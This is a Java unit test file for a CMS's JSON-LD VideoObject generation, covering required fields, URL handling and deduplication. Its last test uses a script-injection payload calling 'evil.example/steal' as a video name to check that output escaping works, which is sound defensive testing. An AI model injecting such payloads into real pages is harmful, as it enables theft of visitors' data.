/*
 * Copyright 2026 SimIS Inc. (https://www.simiscms.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.simisinc.platform.presentation.controller;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.Mockito.mockStatic;

import java.sql.Timestamp;
import java.time.Instant;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.Test;
import org.mockito.MockedStatic;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.simisinc.platform.application.cms.LoadWebPageCommand;

/**
 * VideoObject generation for the self-hosted videos a page shows (issue #1795).
 */
class StructuredDataCommandVideoSchemaTest {

  private static final ObjectMapper MAPPER = new ObjectMapper();
  private static final String SITE_URL = "https://example.org";

  private static PageVideo video() {
    PageVideo pageVideo = new PageVideo();
    pageVideo.setName("HTT in action");
    pageVideo.setDescription("Four HTT units moving independently across open terrain.");
    pageVideo.setThumbnailUrl("/assets/img/20260824035858-255/poster.jpg");
    pageVideo.setContentUrl("/assets/view/20260820014544-8/SimIS-HTT%20long.mp4");
    pageVideo.setEncodingFormat("video/mp4");
    pageVideo.setUploadDate(Timestamp.valueOf("2026-08-20 01:45:44"));
    return pageVideo;
  }

  private static PageRenderInfo pageWith(PageVideo... videos) {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.addVideos(List.of(videos));
    return pageRenderInfo;
  }

  @Test
  void aPageWithNoVideosGetsNoVideoNodes() {
    // Every page on a site without video takes this path, and its graph must not change at all
    assertTrue(StructuredDataCommand.computeVideoSchemas(new PageRenderInfo(), SITE_URL).isEmpty());
    assertTrue(StructuredDataCommand.computeVideoSchemas(null, SITE_URL).isEmpty());
  }

  @Test
  void aVideoCarriesEverythingGoogleAsksFor() {
    List<Map<String, Object>> videoSchemaList = StructuredDataCommand.computeVideoSchemas(pageWith(video()), SITE_URL);
    assertEquals(1, videoSchemaList.size());
    Map<String, Object> schema = videoSchemaList.get(0);
    assertEquals("VideoObject", schema.get("@type"));
    assertEquals("HTT in action", schema.get("name"));
    assertEquals("Four HTT units moving independently across open terrain.", schema.get("description"));
    // Relative paths are made absolute here, the same as the site logo and the page image
    assertEquals(SITE_URL + "/assets/img/20260824035858-255/poster.jpg", schema.get("thumbnailUrl"));
    assertEquals(SITE_URL + "/assets/view/20260820014544-8/SimIS-HTT%20long.mp4", schema.get("contentUrl"));
    assertEquals("video/mp4", schema.get("encodingFormat"));
    // ISO 8601, matching datePublished/dateModified on the WebPage node. Asserted by parsing it
    // back rather than against a literal: Timestamp.valueOf reads the JVM's zone, so a literal
    // would encode whichever zone the machine running the suite happens to be in
    assertEquals(Timestamp.valueOf("2026-08-20 01:45:44").toInstant(),
        Instant.parse((String) schema.get("uploadDate")));
  }

  @Test
  void aVideoAlreadyHostedElsewhereKeepsItsOwnUrls() {
    PageVideo pageVideo = video();
    pageVideo.setThumbnailUrl("https://cdn.example.net/poster.jpg");
    pageVideo.setContentUrl("https://cdn.example.net/promo.mp4");
    Map<String, Object> schema = StructuredDataCommand.computeVideoSchemas(pageWith(pageVideo), SITE_URL).get(0);
    assertEquals("https://cdn.example.net/poster.jpg", schema.get("thumbnailUrl"));
    assertEquals("https://cdn.example.net/promo.mp4", schema.get("contentUrl"));
  }

  @Test
  void anOptionalPartThatIsMissingLeavesNoEmptyKey() {
    // description and contentUrl are recommended, not required -- a video without them is still
    // eligible, and saying "description": null would be worse than saying nothing
    PageVideo pageVideo = video();
    pageVideo.setDescription(null);
    pageVideo.setContentUrl(null);
    pageVideo.setEncodingFormat(null);
    Map<String, Object> schema = StructuredDataCommand.computeVideoSchemas(pageWith(pageVideo), SITE_URL).get(0);
    assertFalse(schema.containsKey("description"));
    assertFalse(schema.containsKey("contentUrl"));
    assertFalse(schema.containsKey("encodingFormat"));
    assertEquals("HTT in action", schema.get("name"));
  }

  @Test
  void aVideoMissingSomethingRequiredIsDroppedRatherThanEmittedIncomplete() {
    PageVideo noName = video();
    noName.setName(" ");
    PageVideo noThumbnail = video();
    noThumbnail.setThumbnailUrl(null);
    PageVideo noUploadDate = video();
    noUploadDate.setUploadDate(null);
    // The good one is still emitted -- one incomplete video does not cost the page the others
    List<Map<String, Object>> videoSchemaList = StructuredDataCommand
        .computeVideoSchemas(pageWith(noName, noThumbnail, noUploadDate, video()), SITE_URL);
    assertEquals(1, videoSchemaList.size());
    assertEquals("HTT in action", videoSchemaList.get(0).get("name"));
  }

  @Test
  void everyVideoOnThePageIsEmittedInOrder() {
    PageVideo second = video();
    second.setName("ADRT in action");
    second.setContentUrl("/assets/view/20260819194636-3/SimIS-ADRT.mp4");
    List<Map<String, Object>> videoSchemaList = StructuredDataCommand
        .computeVideoSchemas(pageWith(video(), second), SITE_URL);
    assertEquals(2, videoSchemaList.size());
    assertEquals("HTT in action", videoSchemaList.get(0).get("name"));
    assertEquals("ADRT in action", videoSchemaList.get(1).get("name"));
  }

  @Test
  void thereIsOneNodeForOneVideoHoweverManyTimesThePageShowsIt() {
    // A panel that opens a modal renders the same video twice; two nodes would say the page has
    // two videos
    PageVideo again = video();
    again.setThumbnailUrl("/assets/img/20260824035858-255/a-different-poster.jpg");
    List<Map<String, Object>> videoSchemaList = StructuredDataCommand
        .computeVideoSchemas(pageWith(video(), again), SITE_URL);
    assertEquals(1, videoSchemaList.size());
  }

  @Test
  void twoDifferentVideosAreNotCollapsedIntoOne() {
    PageVideo other = video();
    other.setName("ADRT in action");
    other.setContentUrl("/assets/view/20260819194636-3/SimIS-ADRT.mp4");
    assertEquals(2, StructuredDataCommand.computeVideoSchemas(pageWith(video(), other), SITE_URL).size());
  }

  @Test
  void theVideoJoinsThePagesGraph() throws Exception {
    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");
    PageRenderInfo pageRenderInfo = pageWith(video());
    pageRenderInfo.setPageUrl(SITE_URL + "/htt-human-type-targets");
    pageRenderInfo.setTitle("HTT");

    String jsonLd;
    try (MockedStatic<LoadWebPageCommand> loadWebPage = mockStatic(LoadWebPageCommand.class)) {
      loadWebPage.when(() -> LoadWebPageCommand.loadByLink(org.mockito.ArgumentMatchers.anyString()))
          .thenReturn(null);
      jsonLd = StructuredDataCommand.generateJsonLdData(pageRenderInfo, SITE_URL, "/htt-human-type-targets",
          sitePropertyMap, null, null, null, Collections.emptyList());
    }

    JsonNode graph = MAPPER.readTree(jsonLd).get("@graph");
    JsonNode found = null;
    for (JsonNode node : graph) {
      if ("VideoObject".equals(node.get("@type").asText())) {
        found = node;
      }
    }
    assertNull(graph.get(0).get("videos"), "the videos ride on the page, not on the Organization node");
    assertEquals("HTT in action", found.get("name").asText());
    assertEquals(SITE_URL + "/assets/img/20260824035858-255/poster.jpg", found.get("thumbnailUrl").asText());
  }

  @Test
  void aPoisonedVideoNameCannotBreakOutOfTheScriptTag() {
    PageVideo pageVideo = video();
    pageVideo.setName("</script><script>fetch('https://evil.example/steal')</script>");
    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    String jsonLd;
    try (MockedStatic<LoadWebPageCommand> loadWebPage = mockStatic(LoadWebPageCommand.class)) {
      loadWebPage.when(() -> LoadWebPageCommand.loadByLink(org.mockito.ArgumentMatchers.anyString()))
          .thenReturn(null);
      jsonLd = StructuredDataCommand.generateJsonLdData(pageWith(pageVideo), SITE_URL, "/a-page",
          sitePropertyMap, null, null, null, Collections.emptyList());
    }
    assertFalse(jsonLd.toLowerCase().contains("</script"), jsonLd);
    assertFalse(jsonLd.contains("<script>"), jsonLd);
  }
}
